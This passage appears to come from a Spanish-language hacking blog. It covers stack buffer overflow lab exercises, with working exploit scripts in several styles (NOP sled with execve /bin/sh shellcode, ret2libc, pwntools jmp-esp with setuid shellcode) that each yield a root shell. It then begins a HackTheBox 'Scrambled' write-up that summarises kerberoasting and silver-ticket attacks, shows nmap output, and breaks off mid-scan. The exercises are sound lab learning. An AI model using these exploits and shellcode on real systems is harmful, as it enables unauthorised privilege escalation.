0xffffd640:	0x61636f6c	0x69622f6c	0x752f3a6e	0x732f7273
0xffffd650:	0x3a6e6962	0x7273752f	0x6e69622f	0x62732f3a
0xffffd660:	0x2f3a6e69	0x3a6e6962	0x7273752f	0x636f6c2f
0xffffd670:	0x672f6c61	0x73656d61	0x73752f3a	0x61672f72
0xffffd680:	0x0073656d	0x4d524554	0x616c613d	0x74697263
0xffffd690:	0x58007974	0x48545541	0x5449524f	0x682f3d59
0xffffd6a0:	0x2f656d6f	0x7567696d	0x2e2f6c65	0x74756158
0xffffd6b0:	0x69726f68	0x58007974	0x435f4744	0x45525255
0xffffd6c0:	0x445f544e	0x544b5345	0x693d504f	0x534c0033
0xffffd6d0:	0x4c4f435f	0x3d53524f	0x303d7372	0x3d69643a
0xffffd6e0:	0x333b3130	0x6e6c3a34	0x3b31303d	0x6d3a3633
gdb-peda<span class="err">$</span>
</code></pre></div></div>

<ul>
  <li>
    <p>Bueno vamos a tomar una dirección que contengo solo <code class="language-plaintext highlighter-rouge">nops</code> que es la esta mas repetida en este caso seria esta que yo elegí <code class="language-plaintext highlighter-rouge">0xffffd520:0x90909090</code>.</p>
  </li>
  <li>
    <p><strong>Junk</strong> contiene una secuencia de caracteres <code class="language-plaintext highlighter-rouge">\x90</code> que, en hexadecimal, equivale a <code class="language-plaintext highlighter-rouge">0x90</code>, que es una sola instrucción <code class="language-plaintext highlighter-rouge">NOP</code>.</p>
  </li>
  <li>
    <p>De igual forma estamos en <code class="language-plaintext highlighter-rouge">little endian</code> así que vamos a darle la vuelta.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0xffffd530    | <span class="se">\x</span>ff<span class="se">\x</span>ff<span class="se">\x</span>d5<span class="se">\x</span>30     | <span class="se">\x</span>30<span class="se">\x</span>d5<span class="se">\x</span>ff<span class="se">\x</span>ff
</code></pre></div></div>

<ul>
  <li>Ahora lo que vamos a hacer es cambiar los 4 B que habías puesto por la dirección en los <code class="language-plaintext highlighter-rouge">nops</code> esto para que los <code class="language-plaintext highlighter-rouge">nops</code> se desplacen en la pila asta llegar al <code class="language-plaintext highlighter-rouge">shellcode</code> y se ejecute.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels <span class="nb">cat </span>otro.py
<span class="c">#!/usr/bin/python2</span>
<span class="c"># -*- coding: utf-8 -*-</span>

offset <span class="o">=</span> 268  <span class="c"># En el shellcode son las instrucciones maliciosas</span>

shellcode  <span class="o">=</span> b<span class="s2">""</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">58</span><span class="se">\x</span><span class="s2">99</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">69"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80"</span>

<span class="c"># x90 representa la instrucción "NOP" en lenguaje de máquina</span>
junk <span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">90"</span> <span class="k">*</span> <span class="o">(</span>offset - len<span class="o">(</span>shellcode<span class="o">))</span>

<span class="c"># Usamos la dirección deseada en little endian</span>
eip <span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">30</span><span class="se">\x</span><span class="s2">d5</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff"</span>

<span class="c"># Salida del payload completo</span>
print<span class="o">(</span>junk + shellcode + eip<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Ahora lo ejecutamos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels ./levelThree <span class="si">$(</span>python2 otro.py<span class="si">)</span>
Buf: j
      XRh//shh/bin��0�
<span class="c"># whoami</span>
root
</code></pre></div></div>

<h2 id="ret2libc">Ret2libc</h2>

<ul>
  <li>
    <p><code class="language-plaintext highlighter-rouge">Ret2libc</code>, abreviatura de “<code class="language-plaintext highlighter-rouge">return-to-libc</code>”, es una técnica clásica de explotación utilizada para eludir medidas de seguridad que previenen la ejecución de código inyectado, como las protecciones contra ejecución en la pila (<code class="language-plaintext highlighter-rouge">stack</code>). Esta técnica implica manipular la pila de llamadas de un programa vulnerable para hacer que ejecute funciones ya presentes en la biblioteca <code class="language-plaintext highlighter-rouge">libc</code>, como <code class="language-plaintext highlighter-rouge">system()</code>, que puede ejecutar comandos de <code class="language-plaintext highlighter-rouge">shell</code>.</p>
  </li>
  <li>
    <p>Vamos analizar el código.</p>
  </li>
  <li>
    <p>Esta es la función main.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/vulnhub/buff/ret.png" />
</p>

<ul>
  <li>Esta es la función <code class="language-plaintext highlighter-rouge">overflow</code> y vemos que le esta dando 20 bytes de tamaño al buffer.</li>
</ul>

<p align="center">
<img src="/assets/vulnhub/buff/ret1.png" />
</p>

<ul>
  <li>
    <p>El problema de ahora es que no podemos correr el <code class="language-plaintext highlighter-rouge">shellcode</code> de antes por que mide mas del buffer asignado.</p>
  </li>
  <li>
    <p>Comenzamos enviado 50 bytes.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels gdb <span class="nt">-q</span> levelFour
Reading symbols from levelFour...
<span class="o">(</span>No debugging symbols found <span class="k">in </span>levelFour<span class="o">)</span>
gdb-peda<span class="nv">$ </span>pattern_arg 50
Set 1 arguments to program
gdb-peda<span class="nv">$ </span>run
Starting program: /home/miguel/StackOverflow/levels/levelFour <span class="s1">'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA'</span>
<span class="o">[</span>Thread debugging using libthread_db enabled]
Using host libthread_db library <span class="s2">"/lib/x86_64-linux-gnu/libthread_db.so.1"</span><span class="nb">.</span>
Buf: AAA%AAsAABAA<span class="nv">$AAnAACAA</span><span class="nt">-AA</span><span class="o">(</span>AADAA<span class="p">;</span>AA<span class="o">)</span>AAEAAaAA0AAFAAbA

Program received signal SIGSEGV, Segmentation fault.
Warning: <span class="s1">'set logging off'</span>, an <span class="nb">alias </span><span class="k">for </span>the <span class="nb">command</span> <span class="s1">'set logging enabled'</span>, is deprecated.
Use <span class="s1">'set logging enabled off'</span><span class="nb">.</span>

Warning: <span class="s1">'set logging on'</span>, an <span class="nb">alias </span><span class="k">for </span>the <span class="nb">command</span> <span class="s1">'set logging enabled'</span>, is deprecated.
Use <span class="s1">'set logging enabled on'</span><span class="nb">.</span>
<span class="o">[</span><span class="nt">----------------------------------registers-----------------------------------</span><span class="o">]</span>
EAX: 0x38 <span class="o">(</span><span class="s1">'8'</span><span class="o">)</span>
EBX: 0x41412d41 <span class="o">(</span><span class="s1">'A-AA'</span><span class="o">)</span>
ECX: 0xffffcf4c <span class="nt">--</span><span class="o">&gt;</span> 0x48d58600
EDX: 0x1
ESI: 0xffffd010 <span class="nt">--</span><span class="o">&gt;</span> 0x2
EDI: 0xf7ffcba0 <span class="nt">--</span><span class="o">&gt;</span> 0x0
EBP: 0x44414128 <span class="o">(</span><span class="s1">'(AAD'</span><span class="o">)</span>
ESP: 0xffffcfc0 <span class="o">(</span><span class="s2">"A)AAEAAaAA0AAFAAbA"</span><span class="o">)</span>
EIP: 0x413b4141 <span class="o">(</span><span class="s1">'AA;A'</span><span class="o">)</span>
EFLAGS: 0x10286 <span class="o">(</span>carry PARITY adjust zero SIGN <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
<span class="o">[</span><span class="nt">-------------------------------------code-------------------------------------</span><span class="o">]</span>
Invalid <span class="nv">$PC</span> address: 0x413b4141
<span class="o">[</span><span class="nt">------------------------------------stack-------------------------------------</span><span class="o">]</span>
0000| 0xffffcfc0 <span class="o">(</span><span class="s2">"A)AAEAAaAA0AAFAAbA"</span><span class="o">)</span>
0004| 0xffffcfc4 <span class="o">(</span><span class="s2">"EAAaAA0AAFAAbA"</span><span class="o">)</span>
0008| 0xffffcfc8 <span class="o">(</span><span class="s2">"AA0AAFAAbA"</span><span class="o">)</span>
0012| 0xffffcfcc <span class="o">(</span><span class="s2">"AFAAbA"</span><span class="o">)</span>
0016| 0xffffcfd0 <span class="nt">--</span><span class="o">&gt;</span> 0x4162 <span class="o">(</span><span class="s1">'bA'</span><span class="o">)</span>
0020| 0xffffcfd4 <span class="nt">--</span><span class="o">&gt;</span> 0x0
0024| 0xffffcfd8 <span class="nt">--</span><span class="o">&gt;</span> 0x13
0028| 0xffffcfdc <span class="nt">--</span><span class="o">&gt;</span> 0x3e8
<span class="o">[</span><span class="nt">------------------------------------------------------------------------------</span><span class="o">]</span>
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x413b4141 <span class="k">in</span> ?? <span class="o">()</span>
gdb-peda<span class="err">$</span>
</code></pre></div></div>

<ul>
  <li>Vamos a ver el <code class="language-plaintext highlighter-rouge">offset</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>pattern_offset 0x413b4141
1094402369 found at offset: 28
</code></pre></div></div>

<ul>
  <li>En este tipo de explotaciones tenemos que saber la dirección de la función <code class="language-plaintext highlighter-rouge">system</code> y <code class="language-plaintext highlighter-rouge">exit</code> ya que son funciones de <code class="language-plaintext highlighter-rouge">libc</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>p system
<span class="nv">$1</span> <span class="o">=</span> <span class="o">{</span>&lt;text variable, no debug info&gt;<span class="o">}</span> 0xf7c4c870 &lt;system&gt;
gdb-peda<span class="err">$</span>
</code></pre></div></div>

<ul>
  <li>Ahora la dirección de <code class="language-plaintext highlighter-rouge">exit</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>p <span class="nb">exit</span>
<span class="nv">$2</span> <span class="o">=</span> <span class="o">{</span>&lt;text variable, no debug info&gt;<span class="o">}</span> 0xf7c3c130 &lt;<span class="nb">exit</span><span class="o">&gt;</span>
</code></pre></div></div>

<ul>
  <li>Ahora vamos a ver la dirección de <code class="language-plaintext highlighter-rouge">/bin/sh</code> de <code class="language-plaintext highlighter-rouge">libc</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>find /bin/sh
Searching <span class="k">for</span> <span class="s1">'/bin/sh'</span> <span class="k">in</span>: None ranges
Found 1 results, display max 1 items:
libc.so.6 : 0xf7db5fc8 <span class="o">(</span><span class="s2">"/bin/sh"</span><span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Estamos en <code class="language-plaintext highlighter-rouge">little endian</code> entonces tenemos que darle la vuelta a todas las direcciones.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0xf7c4c870    |   <span class="se">\x</span>f7<span class="se">\x</span>c4<span class="se">\x</span>c8<span class="se">\x</span>70
0xf7c3c130    |   <span class="se">\x</span>f7<span class="se">\x</span>c3<span class="se">\x</span>c1<span class="se">\x</span>30
0xf7db5fc8    |   <span class="se">\x</span>f7<span class="se">\x</span>db<span class="se">\x</span>5f<span class="se">\x</span>c8
</code></pre></div></div>

<ul>
  <li>Ahora definimos el script.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels <span class="nb">cat </span>levelFour.py
<span class="c">#!/usr/bin/python2</span>

offset <span class="o">=</span> 28

junk <span class="o">=</span> b<span class="s2">"A"</span> <span class="k">*</span> offset

addr_system <span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">70</span><span class="se">\x</span><span class="s2">c8</span><span class="se">\x</span><span class="s2">c4</span><span class="se">\x</span><span class="s2">f7"</span>
addr_exit <span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">30</span><span class="se">\x</span><span class="s2">c1</span><span class="se">\x</span><span class="s2">c3</span><span class="se">\x</span><span class="s2">f7"</span>
addr_bin_sh <span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">c8</span><span class="se">\x</span><span class="s2">5f</span><span class="se">\x</span><span class="s2">db</span><span class="se">\x</span><span class="s2">f7"</span> <span class="c"># aqui es donde llamamos a /bin/bash para que nos de una shell</span>

print<span class="o">(</span>junk + addr_system + addr_exit + addr_bin_sh<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Lo ejecutamos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels ./levelFour <span class="si">$(</span>python2 levelFour.py<span class="si">)</span>
Buf: AAAAAAAAAAAAAAAAAAAAAAAAAAAAp�0���
<span class="c"># whoami</span>
root
</code></pre></div></div>

<h2 id="level-5">Level 5</h2>

<ul>
  <li>Gracias a xchg2pwn por la aportación <a href="https://xchg2pwn.github.io">https://xchg2pwn.github.io</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python2</span>
from pwn import process, p32

shell <span class="o">=</span> process<span class="o">(</span><span class="s2">"./levelFive"</span><span class="o">)</span>

offset <span class="o">=</span> 16
junk <span class="o">=</span> b<span class="s2">"A"</span> <span class="k">*</span> offset

jmpesp <span class="o">=</span> p32<span class="o">(</span>0xf7dd4ff7<span class="o">)</span>

setuid <span class="o">=</span> b<span class="s2">"1</span><span class="se">\x</span><span class="s2">dbj</span><span class="se">\x</span><span class="s2">17X</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80"</span>

shellcode  <span class="o">=</span> b<span class="s2">""</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">58</span><span class="se">\x</span><span class="s2">99</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">69"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80"</span>

shell.sendline<span class="o">(</span>junk + jmpesp + setuid + shellcode<span class="o">)</span>
shell.interactive<span class="o">()</span>
</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="vulnhub/machines" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Scrambled (medium)</title><link href="http://localhost:4000/hackthebox/machines/medium/2024/04/30/scrambled.html" rel="alternate" type="text/html" title="HackTheBox - Scrambled (medium)" /><published>2024-04-30T00:00:00-06:00</published><updated>2024-04-30T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/medium/2024/04/30/scrambled</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/medium/2024/04/30/scrambled.html"><![CDATA[<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/6a88f8059e46c1d5652c3c15ac2cb9f3.png" />
</p>

<ul>
  <li>Scrambled is a medium Windows Active Directory machine. Enumerating the website hosted on the remote machine a potential attacker is able to deduce the credentials for the user <code class="language-plaintext highlighter-rouge">ksimpson</code>. On the website, it is also stated that NTLM authentication is disabled meaning that Kerberos authentication is to be used. Accessing the <code class="language-plaintext highlighter-rouge">Public</code> share with the credentials of <code class="language-plaintext highlighter-rouge">ksimpson</code>, a PDF file states that an attacker retrieved the credentials of an SQL database. This is a hint that there is an SQL service running on the remote machine. Enumerating the normal user accounts, it is found that the account <code class="language-plaintext highlighter-rouge">SqlSvc</code> has a <code class="language-plaintext highlighter-rouge">Service Principal Name</code> (SPN) associated with it. An attacker can use this information to perform an attack that is knows as <code class="language-plaintext highlighter-rouge">kerberoasting</code> and get the hash of <code class="language-plaintext highlighter-rouge">SqlSvc</code>. After cracking the hash and acquiring the credentials for the <code class="language-plaintext highlighter-rouge">SqlSvc</code> account an attacker can perform a <code class="language-plaintext highlighter-rouge">silver ticket</code> attack to forge a ticket and impersonate the user <code class="language-plaintext highlighter-rouge">Administrator</code> on the remote MSSQL service. Enumeration of the database reveals the credentials for user <code class="language-plaintext highlighter-rouge">MiscSvc</code>, which can be used to execute code on the remote machine using PowerShell remoting. System enumeration as the new user reveals a <code class="language-plaintext highlighter-rouge">.NET</code> application, which is listening on port <code class="language-plaintext highlighter-rouge">4411</code>. Reverse engineering the application reveals that it is using the insecure <code class="language-plaintext highlighter-rouge">Binary Formatter</code> class to transmit data, allowing the attacker to upload their own payload and get code execution as <code class="language-plaintext highlighter-rouge">nt authority\system</code>.</li>
</ul>

<h2 id="portscan">PortScan</h2>

<ul>
  <li>Comenzamos escaneando los puertos abiertos por el protocolo <code class="language-plaintext highlighter-rouge">TCP</code> así como sus servicios que corren en los puertos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p53</span>,80,88,135,139,389,445,464,593,636,1433,3268,3269,4411,5985,9389,49667,49673,49674,49686,49727 10.10.11.168 <span class="nt">-oN</span> targeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-04-29 18:25 CST
Nmap scan report <span class="k">for </span>10.10.11.168
Host is up <span class="o">(</span>0.082s latency<span class="o">)</span><span class="nb">.</span>

Bug <span class="k">in </span>ms-sql-ntlm-info: no string output.
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Scramble Corp Intranet
| http-methods:
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2024-04-30 00:25:54Z<span class="o">)</span>
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: scrm.local0., Site: Default-First-Site-Name<span class="o">)</span>
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC1.scrm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC1.scrm.local
| Not valid before: 2024-04-30T00:11:57
|_Not valid after:  2025-04-30T00:11:57
|_ssl-date: 2024-04-30T00:29:01+00:00<span class="p">;</span> <span class="nt">-4s</span> from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: scrm.local0., Site: Default-First-Site-Name<span class="o">)</span>
|_ssl-date: 2024-04-30T00:29:01+00:00<span class="p">;</span> <span class="nt">-4s</span> from scanner time.
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC1.scrm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC1.scrm.local
| Not valid before: 2024-04-30T00:11:57
|_Not valid after:  2025-04-30T00:11:57
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00<span class="p">;</span> RTM
| ms-sql-info:
|   10.10.11.168:1433:
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: <span class="nb">false</span>
|_    TCP port: 1433
|_ssl-date: 2024-04-30T00:29:01+00:00<span class="p">;</span> <span class="nt">-4s</span> from scanner time.
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>SSL_Self_Signed_Fallback
| Not valid before: 2024-04-30T00:21:53
|_Not valid after:  2054-04-30T00:21:53
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: scrm.local0., Site: Default-First-Site-Name<span class="o">)</span>
|_ssl-date: 2024-04-30T00:29:01+00:00<span class="p">;</span> <span class="nt">-4s</span> from scanner time.
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC1.scrm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC1.scrm.local
| Not valid before: 2024-04-30T00:11:57
|_Not valid after:  2025-04-30T00:11:57
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: scrm.local0., Site: Default-First-Site-Name<span class="o">)</span>
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC1.scrm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC1.scrm.local
| Not valid before: 2024-04-30T00:11:57
|_Not valid after:  2025-04-30T00:11:57
|_ssl-date: 2024-04-30T00:29:01+00:00<span class="p">;</span> <span class="nt">-4s</span> from scanner time.
4411/tcp  open  found?
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, NCP, NULL, NotesRPC, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns:
|     SCRAMBLECORP_ORDERS_V1.0.3<span class="p">;</span>
|   FourOhFourRequest, GetRequest, HTTPOptions, Help, LPDString, RTSPRequest, SIPOptions:
|     SCRAMBLECORP_ORDERS_V1.0.3<span class="p">;</span>
|_    ERROR_UNKNOWN_COMMAND<span class="p">;</span>
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49686/tcp open  msrpc         Microsoft Windows RPC
49727/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4411-TCP:V<span class="o">=</span>7.94SVN%I<span class="o">=</span>7%D<span class="o">=</span>4/29%Time<span class="o">=</span>66303A95%P<span class="o">=</span>x86_64-pc-linux-gnu%r
SF:<span class="o">(</span>NULL,1D,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>GenericLines,1D,<span class="s2">"SCRAMB
SF:LECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>GetRequest,35,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">
SF:0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">ERROR_UNKNOWN_COMMAND;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>HTTPOptions,35,<span class="s2">"SCRAMBLECORP_OR
SF:DERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">ERROR_UNKNOWN_COMMAND;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>RTSPRequest,35,<span class="s2">"SCRAMB
SF:LECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">ERROR_UNKNOWN_COMMAND;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>RPCCheck,1D,<span class="s2">"
SF:SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>DNSVersionBindReqTCP,1D,<span class="s2">"SCRAMBLE
SF:CORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>DNSStatusRequestTCP,1D,<span class="s2">"SCRAMBLECORP_ORDE
SF:RS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>Help,35,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">ERROR_UN
SF:KNOWN_COMMAND;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>SSLSessionReq,1D,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\</span><span class="s2">
SF:r</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>TerminalServerCookie,1D,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>
SF:TLSSessionReq,1D,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>Kerberos,1D,<span class="s2">"SC
SF:RAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>SMBProgNeg,1D,<span class="s2">"SCRAMBLECORP_ORDERS_
SF:V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>X11Probe,1D,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>Fo
SF:urOhFourRequest,35,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">ERROR_UNKNOWN_COMM
SF:AND;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>LPDString,35,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">ERROR_UNKNO
SF:WN_COMMAND;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>LDAPSearchReq,1D,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">
SF:"</span><span class="o">)</span>%r<span class="o">(</span>LDAPBindReq,1D,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>SIPOptions,3
SF:5,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">ERROR_UNKNOWN_COMMAND;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>LAND
